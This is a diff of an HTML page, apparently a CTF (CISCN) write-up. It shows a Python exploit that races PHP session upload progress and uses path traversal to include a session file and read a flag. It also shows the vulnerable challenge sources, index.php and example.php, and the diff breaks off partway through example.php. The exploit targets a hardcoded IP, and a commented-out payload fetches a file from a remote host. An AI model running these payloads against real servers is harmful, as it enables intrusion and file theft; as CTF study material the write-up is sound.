+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
+</span></span><span class="line"><span class="cl"><span class="n">sessID</span> <span class="o">=</span> <span class="s1">&#39;flag&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://124.70.96.30:24381/&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># data = {&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &#39;&lt;?php phpinfo();?&gt;&#39;}</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># data = {&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &#39;&lt;?php echo(&#34;PWN!!!&#34;);copy(&#34;http://IP/x.txt&#34;,&#34;/tmp/pwn&#34;);?&gt;&#39;}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;</span><span class="p">:</span> <span class="s1">&#39;&lt;?php show_source(&#34;/etc/ibcdajejbd/fhccbdadhd/abeadaafbb/iddjieeddf/gihbgceded/fl444444g&#34;);?&gt;&#39;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">f</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">256</span> <span class="o">*</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">:</span> <span class="n">sessID</span><span class="p">},</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;a.txt&#39;</span><span class="p">,</span> <span class="n">f</span><span class="p">)}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;field&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;cf&#34;</span><span class="p">:</span> <span class="s2">&#34;../../../../../../../../../../var/lib/php/sessions/ddfdafcded/sess_&#34;</span> <span class="o">+</span> <span class="n">sessID</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;CISCN&#39;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] trying&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">write</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">write</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">session</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl"><span class="n">write</span><span class="o">.</span><span class="n">daemon</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl"><span class="n">write</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">read</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h2 id="web-upload"><a href="#web-upload" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:web-upload" class="headings">web-upload</a></h2>
 <p><code>index.php</code></p>
@@ -685,38 +685,38 @@ drwxr-xr-x 1 root root 4096 Sep 22 2016 ..
 </span><span class="lnt">31
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"> <span class="o">&lt;?</span><span class="nx">php</span>
-<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">]))</span> <span class="p">{</span>
-    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-    <span class="k">die</span><span class="p">();</span>
-<span class="p">}</span>
-
-<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">]))</span>
-    <span class="nv">$ctf</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">];</span>
-
-<span class="k">if</span><span class="p">(</span><span class="nv">$ctf</span><span class="o">==</span><span class="s2">&#34;upload&#34;</span><span class="p">)</span> <span class="p">{</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;postedFile&#39;</span><span class="p">][</span><span class="s1">&#39;size&#39;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">1024</span><span class="o">*</span><span class="mi">512</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;这么大个的东西你是想d我吗？&#34;</span><span class="p">);</span>
-    <span class="p">}</span>
-    <span class="nv">$imageinfo</span> <span class="o">=</span> <span class="nx">getimagesize</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;postedFile&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]);</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nv">$imageinfo</span> <span class="o">===</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;如果不能好好传图片的话就还是不要来打扰我了&#34;</span><span class="p">);</span>
-    <span class="p">}</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nv">$imageinfo</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nv">$imageinfo</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;东西不能方方正正的话就很讨厌&#34;</span><span class="p">);</span>
-    <span class="p">}</span>
-    <span class="nv">$fileName</span><span class="o">=</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;postedFile&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
-    <span class="k">if</span><span class="p">(</span><span class="nx">stristr</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="s2">&#34;c&#34;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="s2">&#34;i&#34;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="s2">&#34;h&#34;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="s2">&#34;ph&#34;</span><span class="p">))</span> <span class="p">{</span>
-        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;有些东西让你传上去的话那可不得了&#34;</span><span class="p">);</span>
-    <span class="p">}</span>
-    <span class="nv">$imagePath</span> <span class="o">=</span> <span class="s2">&#34;/var/www/html/image/&#34;</span> <span class="o">.</span> <span class="nx">mb_strtolower</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">);</span>
-    <span class="k">if</span><span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;postedFile&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">],</span> <span class="nv">$imagePath</span><span class="p">))</span> <span class="p">{</span>
-        <span class="k">echo</span> <span class="s2">&#34;upload success, image at </span><span class="si">$imagePath</span><span class="s2">&#34;</span><span class="p">;</span>
-    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;传都没有传上去&#34;</span><span class="p">);</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$ctf</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$ctf</span><span class="o">==</span><span class="s2">&#34;upload&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;postedFile&#39;</span><span class="p">][</span><span class="s1">&#39;size&#39;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">1024</span><span class="o">*</span><span class="mi">512</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;这么大个的东西你是想d我吗？&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$imageinfo</span> <span class="o">=</span> <span class="nx">getimagesize</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;postedFile&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$imageinfo</span> <span class="o">===</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;如果不能好好传图片的话就还是不要来打扰我了&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$imageinfo</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nv">$imageinfo</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;东西不能方方正正的话就很讨厌&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$fileName</span><span class="o">=</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;postedFile&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">stristr</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="s2">&#34;c&#34;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="s2">&#34;i&#34;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="s2">&#34;h&#34;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="s2">&#34;ph&#34;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;有些东西让你传上去的话那可不得了&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$imagePath</span> <span class="o">=</span> <span class="s2">&#34;/var/www/html/image/&#34;</span> <span class="o">.</span> <span class="nx">mb_strtolower</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;postedFile&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">],</span> <span class="nv">$imagePath</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;upload success, image at </span><span class="si">$imagePath</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;传都没有传上去&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p><code>example.php</code></p>
 <div class="highlight"><div class="chroma">
@@ -765,49 +765,49 @@ drwxr-xr-x 1 root root 4096 Sep 22 2016 ..
 </span><span class="lnt">42
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">]))</span> <span class="p">{</span>
-    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-    <span class="k">die</span><span class="p">();</span>
-<span class="p">}</span>
-
-<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">]))</span>
-    <span class="nv">$ctf</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">];</span>
-
-<span class="k">if</span><span class="p">(</span><span class="nv">$ctf</span><span class="o">==</span><span class="s2">&#34;poc&#34;</span><span class="p">)</span> <span class="p">{</span>
-    <span class="nv">$zip</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">\ZipArchive</span><span class="p">();</span>
-    <span class="nv">$name_for_zip</span> <span class="o">=</span> <span class="s2">&#34;example/&#34;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">];</span>
-    <span class="k">if</span><span class="p">(</span><span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span><span class="nv">$name_for_zip</span><span class="p">)[</span><span class="nx">count</span><span class="p">(</span><span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span><span class="nv">$name_for_zip</span><span class="p">))</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">!==</span><span class="s2">&#34;zip&#34;</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;要不咱们再看看？&#34;</span><span class="p">);</span>
-    <span class="p">}</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">open</span><span class="p">(</span><span class="nv">$name_for_zip</span><span class="p">)</span> <span class="o">!==</span> <span class="k">TRUE</span><span class="p">)</span> <span class="p">{</span> 
-        <span class="k">die</span> <span class="p">(</span><span class="s2">&#34;都不能解压呢&#34;</span><span class="p">);</span> 
-    <span class="p">}</span> 
-    
-    <span class="k">echo</span> <span class="s2">&#34;可以解压，我想想存哪里&#34;</span><span class="p">;</span>
-    <span class="nv">$pos_for_zip</span> <span class="o">=</span> <span class="s2">&#34;/tmp/example/&#34;</span> <span class="o">.</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REMOTE_ADDR&#34;</span><span class="p">]);</span>
-    <span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">extractTo</span><span class="p">(</span><span class="nv">$pos_for_zip</span><span class="p">);</span>
-    <span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
-    <span class="nx">unlink</span><span class="p">(</span><span class="nv">$name_for_zip</span><span class="p">);</span>
-    <span class="nv">$files</span> <span class="o">=</span> <span class="nx">glob</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$pos_for_zip</span><span class="s2">/*&#34;</span><span class="p">);</span>
-    <span class="k">foreach</span><span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">){</span>
-        <span class="k">if</span> <span class="p">(</span><span class="nx">is_dir</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
-            <span class="k">continue</span><span class="p">;</span>
-        <span class="p">}</span>
-        <span class="nv">$first</span> <span class="o">=</span> <span class="nx">imagecreatefrompng</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
-        <span class="nv">$size</span> <span class="o">=</span> <span class="nx">min</span><span class="p">(</span><span class="nx">imagesx</span><span class="p">(</span><span class="nv">$first</span><span class="p">),</span> <span class="nx">imagesy</span><span class="p">(</span><span class="nv">$first</span><span class="p">));</span>
-        <span class="nv">$second</span> <span class="o">=</span> <span class="nx">imagecrop</span><span class="p">(</span><span class="nv">$first</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;x&#39;</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;y&#39;</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;width&#39;</span> <span class="o">=&gt;</span> <span class="nv">$size</span><span class="p">,</span> <span class="s1">&#39;height&#39;</span> <span class="o">=&gt;</span> <span class="nv">$size</span><span class="p">]);</span>
-        <span class="k">if</span> <span class="p">(</span><span class="nv">$second</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
-            <span class="nv">$final_name</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$file</span><span class="p">)[</span><span class="s2">&#34;basename&#34;</span><span class="p">];</span>
-            <span class="nx">imagepng</span><span class="p">(</span><span class="nv">$second</span><span class="p">,</span> <span class="s1">&#39;example/&#39;</span><span class="o">.</span><span class="nv">$final_name</span><span class="p">);</span>
-            <span class="nx">imagedestroy</span><span class="p">(</span><span class="nv">$second</span><span class="p">);</span>
-        <span class="p">}</span>
-        <span class="nx">imagedestroy</span><span class="p">(</span><span class="nv">$first</span><span class="p">);</span>
-        <span class="nx">unlink</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
-    <span class="p">}</span>
-
-<span class="p">}</span> 
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$ctf</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$ctf</span><span class="o">==</span><span class="s2">&#34;poc&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$zip</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">\ZipArchive</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$name_for_zip</span> <span class="o">=</span> <span class="s2">&#34;example/&#34;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span><span class="nv">$name_for_zip</span><span class="p">)[</span><span class="nx">count</span><span class="p">(</span><span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span><span class="nv">$name_for_zip</span><span class="p">))</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">!==</span><span class="s2">&#34;zip&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;要不咱们再看看？&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">open</span><span class="p">(</span><span class="nv">$name_for_zip</span><span class="p">)</span> <span class="o">!==</span> <span class="k">TRUE</span><span class="p">)</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">die</span> <span class="p">(</span><span class="s2">&#34;都不能解压呢&#34;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;可以解压，我想想存哪里&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$pos_for_zip</span> <span class="o">=</span> <span class="s2">&#34;/tmp/example/&#34;</span> <span class="o">.</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REMOTE_ADDR&#34;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">extractTo</span><span class="p">(</span><span class="nv">$pos_for_zip</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">unlink</span><span class="p">(</span><span class="nv">$name_for_zip</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$files</span> <span class="o">=</span> <span class="nx">glob</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$pos_for_zip</span><span class="s2">/*&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">foreach</span><span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">is_dir</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$first</span> <span class="o">=</span> <span class="nx">imagecreatefrompng</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$size</span> <span class="o">=</span> <span class="nx">min</span><span class="p">(</span><span class="nx">imagesx</span><span class="p">(</span><span class="nv">$first</span><span class="p">),</span> <span class="nx">imagesy</span><span class="p">(</span><span class="nv">$first</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$second</span> <span class="o">=</span> <span class="nx">imagecrop</span><span class="p">(</span><span class="nv">$first</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;x&#39;</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;y&#39;</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;width&#39;</span> <span class="o">=&gt;</span> <span class="nv">$size</span><span class="p">,</span> <span class="s1">&#39;height&#39;</span> <span class="o">=&gt;</span> <span class="nv">$size</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$second</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$final_name</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$file</span><span class="p">)[</span><span class="s2">&#34;basename&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">imagepng</span><span class="p">(</span><span class="nv">$second</span><span class="p">,</span> <span class="s1">&#39;example/&#39;</span><span class="o">.</span><span class="nv">$final_name</span><span class="p">);</span>
